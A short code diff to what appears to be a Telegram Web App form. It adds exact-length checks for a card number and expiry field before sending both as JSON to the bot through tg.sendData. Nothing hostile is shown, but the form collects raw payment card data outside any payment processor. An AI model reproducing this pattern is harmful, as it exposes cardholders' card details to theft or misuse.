@@ -60,6 +60,16 @@
         return;
       }
 
+      if (cardnum.length < 16 || cardnum.length > 16) {
+        errorDiv.textContent = "Please enter right card number";
+        return;
+      }
+      
+      if (cardend.length < 5 || cardend.length > 5) {
+        errorDiv.textContent = "Please enter right card year";
+        return;
+      }
+
       tg.sendData(JSON.stringify({
         cardnum: cardnum,
         cardend: cardend
